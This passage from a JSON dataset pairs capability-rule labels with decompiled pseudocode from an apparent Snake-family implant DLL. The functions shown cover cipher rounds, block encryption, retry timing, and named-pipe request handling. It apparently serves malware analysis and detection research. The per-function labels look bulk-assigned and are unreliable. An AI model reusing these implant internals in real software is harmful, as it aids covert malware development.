^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                        *((uVar4 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n        uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x18] + uVar6, arg_ch[0x19]);\n        var_4h = var_4h ^ ((*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                          *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar4 >> 0x18) * 4 + 0x2002e1c8);\n    }\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x16] - var_4h, arg_ch[0x17]);\n    uVar6 = uVar6 ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar4 & 0xff) * 4 + 0x2002ddc8) ^\n                    *((uVar4 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x14] ^ uVar6, arg_ch[0x15]);\n    var_4h = var_4h ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar4 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x12] + var_4h, arg_ch[0x13]);\n    uVar6 = uVar6 ^ ((*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar4 >> 0x18) * 4 + 0x2002e1c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x10] - uVar6, arg_ch[0x11]);\n    var_4h = var_4h ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar4 & 0xff) * 4 + 0x2002ddc8) ^\n                      *((uVar4 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0xe] ^ var_4h, arg_ch[0xf]);\n    uVar6 = uVar6 ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar4 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0xc] + uVar6, arg_ch[0xd]);\n    var_4h = var_4h ^ ((*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar4 >> 0x18) * 4 + 0x2002e1c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[10] - var_4h, arg_ch[0xb]);\n    uVar6 = uVar6 ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar4 & 0xff) * 4 + 0x2002ddc8) ^\n                    *((uVar4 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[8] ^ uVar6, arg_ch[9]);\n    var_4h = var_4h ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar4 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[6] + var_4h, arg_ch[7]);\n    uVar6 = uVar6 ^ ((*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar4 >> 0x18) * 4 + 0x2002e1c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[4] - uVar6, arg_ch[5]);\n    var_4h = var_4h ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar4 & 0xff) * 4 + 0x2002ddc8) ^\n                      *((uVar4 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar4 = sub.msvcrt.dll__lrotl(arg_ch[2] ^ var_4h, arg_ch[3]);\n    uVar6 = uVar6 ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar4 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar5 = sub.msvcrt.dll__lrotl(*arg_ch + uVar6, arg_ch[1]);\n    uVar4 = *((uVar5 >> 8 & 0xff) * 4 + 0x2002d9c8);\n    uVar1 = *((uVar5 & 0xff) * 4 + 0x2002ddc8);\n    iVar2 = *((uVar5 >> 0x18) * 4 + 0x2002e1c8);\n    iVar3 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    arg_8h[1] = uVar6;\n    *arg_8h = ((uVar1 ^ uVar4) - iVar2) + iVar3 ^ var_4h;\n    return;\n}\n",
        "token_count": 2516
    },
    "200142cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.200142cd(uint8_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint8_t *arg_18h, uint32_t arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_18h = *arg_18h << 0x18 | arg_18h[1] << 0x10 | arg_18h[2] << 8 | arg_18h[3];\n    var_14h = arg_18h[4] << 0x18 | arg_18h[5] << 0x10 | arg_18h[6] << 8 | arg_18h[7];\n    if (arg_1ch == 0) {\n        iVar5 = arg_10h - 8;\n        uVar1 = var_14h;\n        iVar4 = iVar5;\n        if (-1 < iVar5) {\n            var_10h = arg_10h >> 3;\n            iVar2 = var_10h * -8;\n            arg_1ch = var_14h;\n            var_4h = var_18h;\n            do {\n                var_18h = *arg_8h << 0x18 | arg_8h[1] << 0x10 | arg_8h[2] << 8 | arg_8h[3];\n                var_14h = arg_8h[4] << 0x18 | arg_8h[5] << 0x10 | arg_8h[6] << 8 | arg_8h[7];\n                arg_8h = arg_8h + 8;\n                var_ch = var_14h;\n                var_8h = var_18h;\n                fcn.20013ea8(&var_18h, arg_14h);\n                var_4h = var_4h ^ var_18h;\n                *arg_ch = var_4h >> 0x18;\n                arg_1ch = arg_1ch ^ var_14h;\n                arg_ch[1] = var_4h >> 0x10;\n                arg_ch[2] = var_4h >> 8;\n                arg_ch[3] = var_4h;\n                arg_ch[4] = arg_1ch >> 0x18;\n                arg_ch[5] = arg_1ch >> 0x10;\n                arg_ch[6] = arg_1ch >> 8;\n                arg_ch[7] = arg_1ch;\n                var_4h = var_8h;\n                arg_ch = arg_ch + 8;\n                var_10h = var_10h - 1;\n                arg_1ch = var_ch;\n                var_18h = var_8h;\n                uVar1 = var_ch;\n                iVar4 = iVar5 + iVar2;\n            } while (var_10h != 0);\n        }\n        arg_10h = iVar4;\n        if (arg_10h != -8) {\n            var_8h = *arg_8h << 0x18 | arg_8h[1] << 0x10 | arg_8h[2] << 8 | arg_8h[3];\n            var_14h = arg_8h[4] << 0x18 | arg_8h[5] << 0x10 | CONCAT11(arg_8h[6], arg_8h[7]);\n            var_4h = var_18h;\n            var_18h = var_8h;\n            var_ch = var_14h;\n            fcn.20013ea8(&var_18h, arg_14h);\n            var_4h = var_4h ^ var_18h;\n            var_14h = uVar1 ^ var_14h;\n            arg_ch = arg_ch + arg_10h + 8;\n            var_18h = var_8h;\n            uVar1 = var_ch;\n            if (arg_10h + 7 < 8) {\n    // switch table (8 cases) at 0x20014699\n                switch(*((arg_10h + 7) * 4 + 0x20014699)) {\n                case 0x200145fb:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_14h;\n                case 0x200145fe:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_14h >> 8;\n                case 0x20014606:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_14h >> 0x10;\n                case 0x2001460e:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_14h >> 0x18;\n                case 0x20014614:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_4h;\n                case 0x20014617:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_4h >> 8;\n                case 0x2001461f:\n                    arg_ch = arg_ch + -1;\n                    *arg_ch = var_4h >> 0x10;\n                case 0x20014627:\n                    arg_ch[-1] = var_4h >> 0x18;\n                }\n            }\n        }\n    }\n    else {\n        iVar4 = arg_10h - 8;\n        if (-1 < iVar4) {\n            var_ch = arg_10h >> 3;\n            iVar4 = iVar4 + var_ch * -8;\n            arg_1ch = var_18h;\n            var_4h = var_14h;\n            do {\n                var_18h = (*arg_8h << 0x18 | arg_8h[1] << 0x10 | arg_8h[2] << 8 | arg_8h[3]) ^ arg_1ch;\n                var_14h = (arg_8h[4] << 0x18 | arg_8h[5] << 0x10 | arg_8h[6] << 8 | arg_8h[7]) ^ var_4h;\n                arg_8h = arg_8h + 8;\n                fcn.20013a8a(&var_18h, arg_14h);\n                *arg_ch = var_18h >> 0x18;\n                arg_ch[1] = var_18h >> 0x10;\n                arg_ch[2] = var_18h >> 8;\n                arg_ch[3] = var_18h;\n                arg_ch[4] = var_14h >> 0x18;\n                arg_ch[5] = var_14h >> 0x10;\n                arg_ch[6] = var_14h >> 8;\n                arg_ch[7] = var_14h;\n                arg_ch = arg_ch + 8;\n                var_ch = var_ch - 1;\n                arg_1ch = var_18h;\n                var_4h = var_14h;\n            } while (var_ch != 0);\n        }\n        uVar1 = var_14h;\n        if (iVar4 != -8) {\n            arg_8h = arg_8h + iVar4 + 8;\n            uVar3 = 0;\n            uVar1 = 0;\n    // switch table (8 cases) at 0x20014679\n            switch(iVar4) {\n            case 0:\n                arg_8h = arg_8h + -1;\n                uVar3 = *arg_8h;\n            case -1:\n                arg_8h = arg_8h + -1;\n                uVar3 = uVar3 | *arg_8h << 8;\n            case -2:\n                arg_8h = arg_8h + -1;\n                uVar3 = uVar3 | *arg_8h << 0x10;\n            case -3:\n                arg_8h = arg_8h + -1;\n                uVar3 = uVar3 | *arg_8h << 0x18;\n            case -4:\n                arg_8h = arg_8h + -1;\n                uVar1 = *arg_8h;\n            case -5:\n                arg_8h = arg_8h + -1;\n                uVar1 = uVar1 | *arg_8h << 8;\n            case -6:\n                arg_8h = arg_8h + -1;\n                uVar1 = uVar1 | *arg_8h << 0x10;\n            case -7:\n                uVar1 = uVar1 | arg_8h[-1] << 0x18;\n            default:\n                var_18h = uVar1 ^ var_18h;\n                var_4h = var_14h;\n                var_14h = uVar3 ^ var_14h;\n                fcn.20013a8a(&var_18h, arg_14h);\n                *arg_ch = var_18h >> 0x18;\n                arg_ch[1] = var_18h >> 0x10;\n                arg_ch[2] = var_18h >> 8;\n                arg_ch[3] = var_18h;\n                arg_ch[4] = var_14h >> 0x18;\n                arg_ch[5] = var_14h >> 0x10;\n                arg_ch[6] = var_14h >> 8;\n                arg_ch[7] = var_14h;\n                uVar1 = var_14h;\n            }\n        }\n    }\n    *arg_18h = var_18h >> 0x18;\n    arg_18h[1] = var_18h >> 0x10;\n    arg_18h[2] = var_18h >> 8;\n    arg_18h[3] = var_18h;\n    arg_18h[4] = uVar1 >> 0x18;\n    arg_18h[5] = uVar1 >> 0x10;\n    arg_18h[6] = uVar1 >> 8;\n    arg_18h[7] = uVar1;\n    return;\n}\n",
        "token_count": 2365
    },
    "2001579c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001579c(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t lpBuffer;\n    \n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x20046540) == arg_8h) {\n            if ((arg_8h == -1) || (iVar1 = sub.ntdll.dll_abs(arg_8h),  iVar1 < 0x186a1)) {\n                pcVar3 = \"%s: (%d) %s\";\n            }\n            else {\n                pcVar3 = \"%s: (0x%08x) %s\";\n            }\n            fcn.200088de(pcVar3, arg_ch);\n            return 1;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 1);\n    lpBuffer = 0;\n    (*_sym.imp.KERNEL32.dll_FormatMessageA)(0x1100, 0, arg_8h, 0x400, &lpBuffer, 0, 0);\n    if (lpBuffer == 0) {\n        if ((arg_8h == -1) || (iVar1 = sub.ntdll.dll_abs(arg_8h),  iVar1 < 0x186a1)) {\n            pcVar3 = \"%s: (%d)\";\n        }\n        else {\n            pcVar3 = \"%s: (0x%08x)\";\n        }\n        fcn.200088de(pcVar3, arg_ch);\n        uVar2 = 0;\n    }\n    else {\n        iVar1 = sub.ntdll.dll_strlen(lpBuffer);\n        uVar2 = 1;\n        if (0 < iVar1) {\n            *(iVar1 + -1 + lpBuffer) = 0;\n        }\n        if (1 < iVar1) {\n            *(iVar1 + -2 + lpBuffer) = 0;\n        }\n        iVar1 = sub.ntdll.dll_abs(arg_8h);\n        if (iVar1 < 0x186a1) {\n            pcVar3 = \"%s: (%u) %s\";\n        }\n        else {\n            pcVar3 = \"%s: (0x%08x) %s\";\n        }\n        fcn.200088de(pcVar3, arg_ch);\n        (*_sym.imp.KERNEL32.dll_LocalFree)(lpBuffer);\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(arg_8h);\n    return uVar2;\n}\n",
        "token_count": 565
    },
    "20015b34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20015b34(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    if (arg_14h != 0) {\n        do {\n            if (*(arg_8h + 0x10) != 0) {\n                return 0x21590006;\n            }\n            uVar6 = *(arg_8h + 0x14) * 2;\n            if (arg_14h < uVar6) {\n                uVar6 = arg_14h;\n            }\n            iVar2 = (*pcVar1)();\n            var_4h = fcn.20022a23(*(arg_8h + 4), 0, 0, arg_ch, arg_10h, uVar6, 1);\n            iVar3 = (*pcVar1)();\n            uVar5 = iVar3 + (1 - iVar2);\n            if (((var_4h == 0) || (var_4h == 0x2159000e)) &&\n               (uVar4 = *(arg_8h + 0x14) + uVar5 >> 1,  *(arg_8h + 0x14) = uVar4,  uVar4 < 100)) {\n                *(arg_8h + 0x14) = 100;\n            }\n            if (var_4h == 0x21590002) {\n                if (arg_14h <= uVar6) {\n                    return 0x21590002;\n                }\n                uVar6 = *(arg_8h + 0x14);\n                uVar4 = fcn.200018bf();\n                var_4h = 0x2159000e;\n                *(arg_8h + 0x14) = uVar4 % uVar6 + 1 + uVar6;\n            }\n            if (var_4h != 0x2159000e) {\n                if (var_4h != 0) {\n                    return var_4h;\n                }\n                uVar6 = *(arg_8h + 0x18) + uVar5 >> 1;\n                *(arg_8h + 0x18) = uVar6;\n                if (*(arg_8h + 0x1c) < uVar6) {\n                    *(arg_8h + 0x18) = *(arg_8h + 0x1c);\n                    return 0;\n                }\n                return 0;\n            }\n            if (arg_14h <= uVar5) {\n                return 0x21590002;\n            }\n            if (arg_14h != 0xffffffff) {\n                arg_14h = arg_14h - uVar5;\n            }\n            uVar6 = *(arg_8h + 0x18) >> 1;\n            uVar5 = fcn.200018bf();\n            uVar6 = uVar5 % uVar6 + 1 + uVar6;\n            if (arg_14h < uVar6) {\n                uVar6 = arg_14h - 1;\n            }\n            uVar5 = *(arg_8h + 0x18);\n            uVar4 = fcn.200018bf();\n            uVar5 = uVar4 % (uVar5 >> 1) + 1 + uVar5;\n            *(arg_8h + 0x18) = uVar5;\n            if (*(arg_8h + 0x1c) < uVar5) {\n                *(arg_8h + 0x18) = *(arg_8h + 0x1c);\n            }\n            iVar2 = (*pcVar1)();\n            iVar3 = fcn.200012d6(arg_8h + 8, uVar6);\n            if (iVar3 == 0) {\n                if (*(arg_8h + 0x10) != 0) {\n                    return 0x21590006;\n                }\n                iVar3 = (*pcVar1)();\n                if ((iVar3 - iVar2) + 100U < uVar6) {\n                    iVar3 = 100;\n                }\n                else {\n                    iVar3 = uVar6 - (iVar3 - iVar2);\n                }\n                fcn.200012d6(arg_8h + 8, iVar3);\n            }\n            iVar3 = (*pcVar1)();\n            uVar6 = iVar3 - iVar2;\n            if (arg_14h < iVar3 - iVar2) {\n                uVar6 = arg_14h;\n            }\n            if (arg_14h != 0xffffffff) {\n                arg_14h = arg_14h - uVar6;\n            }\n        } while (arg_14h != 0);\n    }\n    return 0x21590002;\n}\n",
        "token_count": 1133
    },
    "20015fd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.20015fd8(int32_t arg_8h, uint arg_ch, uint8_t **arg_10h, int32_t *arg_14h, int32_t s1, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint *s;\n    uint *var_34h;\n    uint var_30h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint8_t *s2;\n    int32_t var_8h;\n    uint var_1h;\n    \n    s2 = NULL;\n    if (*(unaff_ESI + 0xc) == 0) {\n        if (*(unaff_ESI + 0x10) == 0) {\n            piVar1 = unaff_ESI + 8;\n            if (*piVar1 == 0) {\n                var_18h = *(unaff_ESI + 0x68);\n                var_14h = 0;\n                iVar3 = fcn.2001300b(piVar1, &var_18h, 0, 0, *(unaff_ESI + 0x5c), *(unaff_ESI + 0x60), \n                                     (*(unaff_ESI + 100) & 1) * 2);\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            }\n            if ((s1 != 0) && (arg_1ch == 0)) {\n                return 0x21590002;\n            }\n            var_8h = fcn.2001348f(*piVar1, 0);\n            if (var_8h != 0) {\n                fcn.20013237(piVar1, 0);\n                return var_8h;\n            }\n            *(unaff_ESI + 0x10) = 1;\n        }\n    }\n    else {\n        piVar1 = unaff_ESI + 8;\n        if (*piVar1 == 0) {\n            if ((s1 != 0) && (arg_1ch == 0)) {\n                return 0x21590002;\n            }\n            fcn.20001567(unaff_ESI + 0x44);\n            if (*piVar1 == 0) {\n                iVar3 = fcn.20013311(*(unaff_ESI + 4), piVar1, 0);\n            }\n            else {\n                iVar3 = 0;\n            }\n            fcn.2000157d(unaff_ESI + 0x44);\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    var_8h = 0x21590064;\n    if (arg_8h != 0) {\n        sub.ntdll.dll_memset(&s, 0, 0x20);\n        var_34h = &var_1h;\n        s = &var_28h;\n        var_24h = arg_ch;\n        var_1h._0_1_ = 0x90;\n        var_30h = 1;\n        var_20h = 0x90;\n        var_28h = arg_8h;\n        var_8h = fcn.20013845(*(unaff_ESI + 8), &s, 0);\n        if (var_8h != 0) goto code_r0x200161df;\n    }\n    if (s1 != 0) {\n        var_8h = fcn.200135e2(*(unaff_ESI + 8), &s2, &var_10h, arg_1ch, 0);\n        if (var_8h == 0) {\n            if (0 < var_10h) {\n                var_1h._0_1_ = *s2;\n                uVar4 = var_1h;\n                if (uVar4 + 1 <= var_10h) {\n                    *arg_10h = s2 + uVar4 + 1;\n                    *arg_14h = (var_10h - uVar4) + -1;\n                    uVar2 = var_1h;\n                    if (0x90 < var_1h) {\n                        uVar2 = 0x90;\n                    }\n                    uVar4 = uVar2;\n                    sub.ntdll.dll_memcpy(s1, s2 + 1, uVar4);\n                    sub.ntdll.dll_memset(uVar4 + s1, 0, 0x90 - uVar4);\n                    if (*arg_14h == 0) {\n                        *arg_10h = NULL;\n                    }\n                    else {\n                        s2[var_1h] = var_1h;\n                        s2 = NULL;\n                    }\n                    goto code_r0x200161da;\n                }\n            }\n            var_8h = 0x2159000a;\n            goto code_r0x200161df;\n        }\n        if ((var_8h != 0x21590002) && (fcn.20013237(unaff_ESI + 8, 0),  *(unaff_ESI + 0xc) == 0)) {\n            *(unaff_ESI + 0x10) = 0;\n        }\n    }\ncode_r0x200161da:\n    if (var_8h == 0) {\n        return 0;\n    }\ncode_r0x200161df:\n    fcn.20013299(*(unaff_ESI + 8), s2);\n    fcn.20013237(unaff_ESI + 8, 0);\n    if (*(unaff_ESI + 0xc) == 0) {\n        *(unaff_ESI + 0x10) = 0;\n    }\n    return var_8h;\n}\n",
        "token_count": 1349
    },
    "20016551": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20016551(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EDI;\n    \n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x124);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar2, 0, 0x124);\n        fcn.20001551(iVar2 + 0xd0);\n        fcn.20001551(iVar2 + 0xf0);\n        fcn.200012fa(iVar2 + 0xe8);\n        *(iVar2 + 8) = *(unaff_EDI + 8);\n        *(iVar2 + 0xc) = *(unaff_EDI + 0xc);\n        *(iVar2 + 0x110) = 1;\n        fcn.20001567(unaff_EDI + 0xd0);\n        piVar1 = unaff_EDI + 200;\n        *(iVar2 + 0xbc) = *piVar1;\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0xb8) = iVar2;\n        }\n        *piVar1 = iVar2;\n        if (*(unaff_EDI + 0xc4) == 0) {\n            *(unaff_EDI + 0xc4) = iVar2;\n        }\n        *(unaff_EDI + 0xcc) = *(unaff_EDI + 0xcc) + 1;\n        *(iVar2 + 0xc0) = unaff_EDI;\n        fcn.2000157d(unaff_EDI + 0xd0);\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 402
    },
    "20017687": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.20017687(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x38) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            iVar1 = 0x21590001;\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            iVar1 = fcn.200135e2(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, 1);\n            while (iVar1 == 0) {\n                if (*arg_10h < 0xc) {\n                    fcn.20013299(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                    iVar1 = 0x2159000a;\n                    goto code_r0x2001776a;\n                }\n                sub.ntdll.dll_memcpy(&var_ch, *arg_ch, 0xc);\n                var_ch = (*_sym.imp.WS2_32.dll_ntohl)(var_ch);\n                var_8h = (*_sym.imp.WS2_32.dll_ntohl)(var_8h);\n                if (var_4h != '\\x06') {\n                    if (var_4h != '\\x03') {\n                        fcn.20013299(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                        *(arg_8h + 0x10) = 1;\n                        if (var_4h == '\\x04') {\n                            *(arg_8h + 0x14) = 0x21590006;\n                        }\n                        else {\n                            *(arg_8h + 0x14) = 0x2159000a;\n                        }\n                        return *(arg_8h + 0x14);\n                    }\n                    *arg_10h = *arg_10h - 0xc;\n                    if (*arg_10h < 1) {\n                        fcn.20013299(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                    }\n                    else {\n                        *arg_ch = *arg_ch + 0xc;\n                    }\n                    return 0;\n                }\n                fcn.20013299(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                iVar1 = fcn.200135e2(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, 1);\n            }\n            if (iVar1 == 0x21590003) {\n                iVar1 = 0x21590006;\n            }\n            if (iVar1 != 0x21590002) {\ncode_r0x2001776a:\n                *(arg_8h + 0x10) = 1;\n                *(arg_8h + 0x14) = iVar1;\n            }\n        }\n        else {\n            iVar1 = *(arg_8h + 0x14);\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 816
    },
    "20017982": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20017982(uint *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    iVar2 = sym.inj_snake_Win32.dll_tr_get_callbacks(*arg_8h);\n    while( true ) {\n        do {\n            arg_1ch = 0;\n            iVar3 = fcn.200018bf();\n            iVar3 = sym.inj_snake_Win32.dll_tc_read_request_pipe\n                              (puVar1[1], puVar1[2], &arg_8h, &var_4h, iVar3 % 6000 + 2000, arg_1ch);\n            if ((iVar3 != 0) && (puVar1[3] != 0)) {\n                iVar3 = 0x21590006;\n            }\n        } while (iVar3 == 0x21590002);\n        if (iVar3 != 0) break;\n        iVar3 = (**(iVar2 + 0xc))(*puVar1, arg_8h, var_4h, 0);\n        sym.inj_snake_Win32.dll_tc_free_data(puVar1[1], arg_8h);\n        if (iVar3 != 0) {\ncode_r0x20017a1c:\n            puVar1[3] = 1;\n            return 0;\n        }\n    }\n    if ((iVar3 != 0x21590006) && (puVar1[3] == 0)) {\n        sym.inj_snake_Win32.dll_tc_cancel(puVar1[1], puVar1[2]);\n    }\n    goto code_r0x20017a1c;\n}\n",
        "token_count": 404
    },
    "20017cb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20017cb4(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.20001a1f(in_EAX + 0x1c);\n    piVar1 = NULL;\n    piVar2 = *(in_EAX + 0x18);\n    if (*(in_EAX + 0x18) != NULL) {\n        do {\n            piVar3 = piVar2;\n            if (piVar2[1] == arg_8h) break;\n            piVar3 = *piVar2;\n            piVar1 = piVar2;\n            piVar2 = piVar3;\n        } while (piVar3 != NULL);\n        if (piVar3 != NULL) {\n            if (piVar1 == NULL) {\n                *(in_EAX + 0x18) = *piVar3;\n            }\n            else {\n                *piVar1 = *piVar3;\n            }\n            if (piVar3[3] != 0) {\n                fcn.20013299(piVar3[2], piVar3[3]);\n            }\n            var_4h = piVar3[2];\n            (*_sym.imp.msvcrt.dll_free)(piVar3);\n        }\n    }\n    fcn.20001a68(in_EAX + 0x1c);\n    if (var_4h != 0) {\n        fcn.20017236(arg_ch);\n    }\n    